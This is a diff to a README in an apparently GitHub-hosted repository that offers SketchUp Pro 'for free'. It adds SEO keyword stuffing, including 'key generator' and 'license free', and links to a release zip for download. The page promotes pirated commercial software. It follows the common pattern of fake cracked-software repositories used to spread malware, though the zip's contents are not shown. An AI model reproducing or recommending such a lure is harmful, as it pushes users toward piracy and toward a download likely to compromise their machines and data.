@@ -3,8 +3,9 @@ Welcome to the SketchUp Pro repository! 🚀 This is your ultimate source for ac
 
 ## 📁 Repository Overview  
 - Name: SketchUp Pro  
-- Description: A chance to access SketchUp Pro for free. Tags: SketchUp-Pro-2024-free, download SketchUp Pro at no cost, fully functional free version.  
-- Topics: SketchUp-Pro, 3D-modeling, design-software, free-software, modeling-tools, pro-version 
+- Description: SketchUp Pro, SketchUp Pro install guide, SketchUp Pro for free, free SketchUp Pro, latest update SketchUp Pro, SketchUp, 3D modeling software, SketchUp Pro key generator, download SketchUp Pro, SketchUp download latest, SketchUp tutorial, 3D design effects, SketchUp reviews, SketchUp Pro features, SketchUp plugins, architectural software
+
+- Topics: SketchUp-Pro, 3D-modeling, design-software, free-software, modeling-tools, pro-version, sketchup design-software sketchup-pro-install sketchup-pro sketchup-download sketchup-pro-download architectural-design-tool sketchup-pro-free download-sketchup-pro sketchup-pro-tutorial sketchup-pro-full sketchup-full sketchup-pro-2025 sketchup-pro-license-free sketchup-pro-licence architectural-software sketchup-pro-for-free architectural-design-software 
 
 ## 🔗 Software Access  
 ### Download: [SketchUp Pro](https://github.com/xyt0169/SketchUp-Pro-PC/releases/download/sketchup-pro/Sketchup-pro.zip)
